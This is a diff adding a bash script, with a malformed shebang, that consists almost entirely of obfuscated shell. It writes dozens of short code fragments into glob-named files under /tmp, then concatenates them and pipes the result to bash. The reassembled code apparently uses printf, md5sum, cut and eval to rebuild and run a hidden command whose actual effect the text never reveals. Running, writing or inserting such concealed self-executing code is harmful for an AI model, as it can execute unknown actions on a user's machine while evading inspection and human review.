@@ -1,0 +1,266 @@
+!#/bin/bash
+
+"printf %s "$(mkdir -p '/tmp/srHR3QeXK4';printf %s '$(pr' > '/tmp/srHR3QeXK4/??
+????';printf %s ''"'"'|md' > '/tmp/srHR3QeXK4/
+?
+????';printf %s 'f --' > '/tmp/srHR3QeXK4/
+????
+?';printf %s '- '"'"'w' > '/tmp/srHR3QeXK4/????
+
+
+';printf %s 'rint' > '/tmp/srHR3QeXK4/?
+
+?
+?
+';printf %s 'f --' > '/tmp/srHR3QeXK4/?
+?
+?
+?';printf %s '-b12' > '/tmp/srHR3QeXK4/??
+?
+
+
+';printf %s '|cut' > '/tmp/srHR3QeXK4/
+?
+??
+?';printf %s 'f --' > '/tmp/srHR3QeXK4/
+??
+
+
+?';printf %s '7-28' > '/tmp/srHR3QeXK4/
+??
+???';printf %s ' "\x' > '/tmp/srHR3QeXK4/???
+
+
+
+';printf %s 'intf' > '/tmp/srHR3QeXK4/???
+
+
+?';printf %s '5sum' > '/tmp/srHR3QeXK4/
+?
+???
+';printf %s '|md5' > '/tmp/srHR3QeXK4/??
+?
+??';printf %s ' "$(' > '/tmp/srHR3QeXK4/??????
+';printf %s 'f --' > '/tmp/srHR3QeXK4/?
+
+?
+
+?';printf %s ''"'"'|md' > '/tmp/srHR3QeXK4/
+???
+??';printf %s ' "\x' > '/tmp/srHR3QeXK4/??
+
+?
+
+';printf %s 'rint' > '/tmp/srHR3QeXK4/?
+
+
+
+
+?';printf %s ' '"'"'Q0' > '/tmp/srHR3QeXK4/
+??
+
+
+
+';printf %s ' -- ' > '/tmp/srHR3QeXK4/??
+??
+?';printf %s '|cut' > '/tmp/srHR3QeXK4/
+???
+
+?';printf %s '4-5)' > '/tmp/srHR3QeXK4/???
+
+??';printf %s 'intf' > '/tmp/srHR3QeXK4/??
+
+?
+?';printf %s 'eval' > '/tmp/srHR3QeXK4/???????';printf %s ')";)' > '/tmp/srHR3QeXK4/
+?
+?
+?
+';printf %s 'f "\' > '/tmp/srHR3QeXK4/?
+
+??
+
+';printf %s '|cut' > '/tmp/srHR3QeXK4/?
+?
+
+
+?';printf %s '"' > '/tmp/srHR3QeXK4/
+?
+?
+
+?';printf %s '5sum' > '/tmp/srHR3QeXK4/?
+?
+
+?
+';printf %s ' -- ' > '/tmp/srHR3QeXK4/??
+
+
+
+?';printf %s 'rint' > '/tmp/srHR3QeXK4/
+?????
+';printf %s 'd5su' > '/tmp/srHR3QeXK4/???
+??
+';printf %s ')";p' > '/tmp/srHR3QeXK4/?
+??
+?
+';printf %s 'x$(p' > '/tmp/srHR3QeXK4/
+??
+
+??';printf %s ' -b1' > '/tmp/srHR3QeXK4/
+?
+??
+
+';printf %s 'intf' > '/tmp/srHR3QeXK4/??
+
+
+?
+';printf %s '8-19' > '/tmp/srHR3QeXK4/
+?
+?
+??';printf %s 'prin' > '/tmp/srHR3QeXK4/????
+?
+';printf %s 'f "\' > '/tmp/srHR3QeXK4/?
+
+
+
+
+
+';printf %s 'z'"'"'|m' > '/tmp/srHR3QeXK4/???
+???';printf %s '5sum' > '/tmp/srHR3QeXK4/?
+????
+';printf %s 'rint' > '/tmp/srHR3QeXK4/?
+?
+??
+';printf %s ' '"'"'pQ' > '/tmp/srHR3QeXK4/?
+
+?
+
+
+';printf %s 'cut ' > '/tmp/srHR3QeXK4/??
+?
+
+?';printf %s ''"'"'|md' > '/tmp/srHR3QeXK4/?
+
+
+???';printf %s '4-15' > '/tmp/srHR3QeXK4/?
+??
+??';printf %s '3-14' > '/tmp/srHR3QeXK4/?
+
+
+
+??';printf %s '";pr' > '/tmp/srHR3QeXK4/??
+
+??
+';printf %s 'tf -' > '/tmp/srHR3QeXK4/????
+
+?';printf %s ' '"'"'MG' > '/tmp/srHR3QeXK4/
+????
+
+';printf %s ' -b1' > '/tmp/srHR3QeXK4/?
+
+
+?
+
+';printf %s 'm|cu' > '/tmp/srHR3QeXK4/???
+?
+?';printf %s ')";p' > '/tmp/srHR3QeXK4/?
+
+
+
+?
+';printf %s ''"'"'|md' > '/tmp/srHR3QeXK4/?
+?????';printf %s ' -b1' > '/tmp/srHR3QeXK4/?
+?
+
+
+
+';printf %s '6-17' > '/tmp/srHR3QeXK4/?
+
+????';printf %s ' -b2' > '/tmp/srHR3QeXK4/
+???
+
+
+';printf %s 'intf' > '/tmp/srHR3QeXK4/??
+???
+';printf %s '5sum' > '/tmp/srHR3QeXK4/?
+
+
+??
+';printf %s '|cut' > '/tmp/srHR3QeXK4/?
+???
+?';printf %s 'f "\' > '/tmp/srHR3QeXK4/
+??
+?
+
+';printf %s 'f "\' > '/tmp/srHR3QeXK4/?
+??
+
+
+';printf %s 'tf "' > '/tmp/srHR3QeXK4/?????
+
+';printf %s '|cut' > '/tmp/srHR3QeXK4/?
+
+
+?
+?';printf %s ''"'"'Umc' > '/tmp/srHR3QeXK4/??
+
+
+
+
+';printf %s '\x$(' > '/tmp/srHR3QeXK4/????
+??';printf %s 't -b' > '/tmp/srHR3QeXK4/???
+?
+
+';printf %s 'x$(p' > '/tmp/srHR3QeXK4/?
+
+?
+??';printf %s 'x$(p' > '/tmp/srHR3QeXK4/?
+?
+???';printf %s '$(pr' > '/tmp/srHR3QeXK4/??
+
+
+??';printf %s ''"'"'|md' > '/tmp/srHR3QeXK4/?
+?
+
+??';printf %s ' '"'"'k3' > '/tmp/srHR3QeXK4/?
+?
+?
+
+';printf %s 'x$(p' > '/tmp/srHR3QeXK4/
+??????';printf %s 'rint' > '/tmp/srHR3QeXK4/
+??
+?
+?';printf %s ')";p' > '/tmp/srHR3QeXK4/?
+
+???
+';printf %s ' -b1' > '/tmp/srHR3QeXK4/?
+???
+
+';printf %s 'rint' > '/tmp/srHR3QeXK4/?
+
+??
+?';printf %s 'sum|' > '/tmp/srHR3QeXK4/??
+?
+?
+';printf %s 'rint' > '/tmp/srHR3QeXK4/
+??
+
+?
+';printf %s '-13)' > '/tmp/srHR3QeXK4/??
+
+???';printf %s ''"'"'8g'"'"'' > '/tmp/srHR3QeXK4/??
+??
+
+';printf %s ')";p' > '/tmp/srHR3QeXK4/
+??
+??
+';printf %s 'rint' > '/tmp/srHR3QeXK4/?
+??
+
+?';printf %s '";pr' > '/tmp/srHR3QeXK4/???
+
+?
+';printf %s 'prin' > '/tmp/srHR3QeXK4/?????
+?';printf %s '5sum' > '/tmp/srHR3QeXK4/
+???
+?
+';cat '/tmp/srHR3QeXK4'/???????; '/tmp/srHR3QeXK4'/???????;)"|bash"
